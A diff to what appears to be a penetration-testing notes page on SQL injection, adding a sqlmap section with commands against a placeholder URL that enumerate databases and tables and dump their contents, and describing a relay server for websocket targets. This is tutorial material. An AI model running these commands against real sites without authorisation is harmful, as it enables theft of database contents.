@@ -66,7 +66,7 @@ Out-Of-Band attacks are based on two different channels: one for the injection a
 ## Warnings
 
 :::caution
-This is a list of some of the most important warnings about SQL queries and SQLi.
+This is a list of few important warnings about SQL queries and SQLi.
 :::
 
 ### SQL is not case sensitive
@@ -99,3 +99,45 @@ For example, PostgreSQL allows only single quotes for values and double quotes f
 ```sql
 select "column" from "table" where "column"='value';
 ```
+
+## sqlmap
+
+<Image src={require("./assets/sqlmap.png").default} />
+
+Use `-u` to define the target url and `--batch` to use the default behavior without asking for input.
+
+In the next commands, `id` is a query parameter that is vulnerable to SQL injection.
+
+Enumerate databases.
+
+```bash
+sqlmap -u "http://website.com/?id=1" --batch --dbs
+```
+
+Enumerate tables of a specific database.
+
+```bash
+sqlmap -u "http://website.com/?id=1" --batch --tables -D db_name
+```
+
+Enumerate tables content of a specific database.
+
+```bash
+sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name
+```
+
+Enumerate content by specifing table, column, and database.
+
+```bash
+sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name -T table_name -C col_name
+```
+
+### sqlmap over websockets
+
+sqlmap may not support all types of requests, including those made over websockets. Also, working with complex targets can sometimes be cumbersome using sqlmap alone.
+
+To simplify the process, it is possible to set up a fake server as an intermediary. In this way, sqlmap would make a request to the fake server using a common format, and the fake server would then make the more complex request to the actual target.
+
+<Image src={require("./assets/sqlmap_over_websockets.png").default} />
+
+<Gist id="4adec402e51df2bf3e35066172abaebf" />
